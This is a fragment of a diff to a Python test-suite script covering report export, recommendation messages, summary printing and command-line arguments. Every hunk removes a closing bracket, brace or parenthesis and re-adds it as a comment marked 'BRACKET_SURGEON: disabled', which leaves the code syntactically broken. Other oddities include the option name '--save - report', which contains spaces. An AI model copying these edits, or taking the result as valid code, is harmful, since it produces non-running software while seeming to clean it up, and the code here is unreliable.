                     "performance_metrics": result.performance_metrics,
-                }
+# BRACKET_SURGEON: disabled
+#                 }
                 for result in report.test_results
-            ],
+# BRACKET_SURGEON: disabled
+#             ],
             "recommendations": self._generate_recommendations(report),
-        }
+# BRACKET_SURGEON: disabled
+#         }
 
         with open(filename, "w") as f:
             json.dump(report_data, f, indent=2, default=str)
@@ -1663,13 +1790,15 @@ class ComprehensiveTestSuite:
         if report.performance_score < 70:
             recommendations.append(
                 "Consider optimizing system performance - current score is below 70%"
-            )
+# BRACKET_SURGEON: disabled
+#             )
 
         # Quality recommendations
         if report.quality_score < 80:
             recommendations.append(
                 "Improve content quality validation - current score is below 80%"
-            )
+# BRACKET_SURGEON: disabled
+#             )
 
         # Coverage recommendations
         if report.coverage_percentage < 90:
@@ -1687,13 +1816,15 @@ class ComprehensiveTestSuite:
         # Specific recommendations based on test patterns
         security_failures = sum(
             1 for r in report.test_results if r.test_category == "security" and r.status != "PASS"
-        )
+# BRACKET_SURGEON: disabled
+#         )
         if security_failures > 0:
             recommendations.append("CRITICAL: Address security test failures immediately")
 
         chaos_failures = sum(
             1 for r in report.test_results if r.test_category == "chaos" and r.status != "PASS"
-        )
+# BRACKET_SURGEON: disabled
+#         )
         if chaos_failures > 0:
             recommendations.append("Improve system resilience - chaos engineering tests failed")
 
@@ -1711,7 +1842,8 @@ def print_test_summary(report: TestSuiteReport):
     print(f"Suite: {report.suite_name}")
     print(
         f"Execution Time: {report.start_time.strftime('%Y-%m-%d %H:%M:%S')} - {report.end_time.strftime('%H:%M:%S')}"
-    )
+# BRACKET_SURGEON: disabled
+#     )
     print(f"Duration: {(report.end_time - report.start_time).total_seconds():.1f} seconds")
     print("\\nTEST RESULTS:")
     print(f"  Total Tests: {report.total_tests}")
@@ -1744,7 +1876,8 @@ async def main():
     parser = argparse.ArgumentParser(description="Conservative Research System Test Suite")
     parser.add_argument(
         "--quick", action="store_true", help="Run quick test suite (skip chaos tests)"
-    )
+# BRACKET_SURGEON: disabled
+#     )
     parser.add_argument(
         "--category",
         choices=[
@@ -1755,15 +1888,18 @@ async def main():
             "quality",
             "e2e",
             "chaos",
-        ],
+# BRACKET_SURGEON: disabled
+#         ],
         help="Run specific test category only",
-    )
+# BRACKET_SURGEON: disabled
+#     )
     parser.add_argument(
         "--output",
         default="console",
         choices=["console", "json", "both"],
         help="Output format",
-    )
+# BRACKET_SURGEON: disabled
+#     )
     parser.add_argument("--save - report", action="store_true", help="Save detailed report to file")
 
     args = parser.parse_args()
